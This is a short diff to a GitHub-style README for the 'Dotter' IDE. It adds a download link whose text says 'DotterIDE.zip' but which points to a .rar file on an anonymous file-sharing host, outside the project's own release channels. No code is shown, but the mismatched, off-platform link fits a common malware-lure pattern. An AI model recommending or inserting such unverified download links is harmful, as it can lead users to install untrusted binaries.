@@ -43,6 +43,8 @@ Automatic intelligent tag completion, Syntax highlighting ([Scintilla](https://g
 
 Intelligent bracket (") Completion like VSCode.
 
+## Download Dotter IDE:
+[Download DotterIDE.zip](https://filebin.net/8uajfrrogi2co46r/Dotter.rar)
 ## Why did you stop updating/making Dotter?
 i was bored cause this project took me too long to make, so this is why i published it on github so there will be people who will continue making it 🙂
 
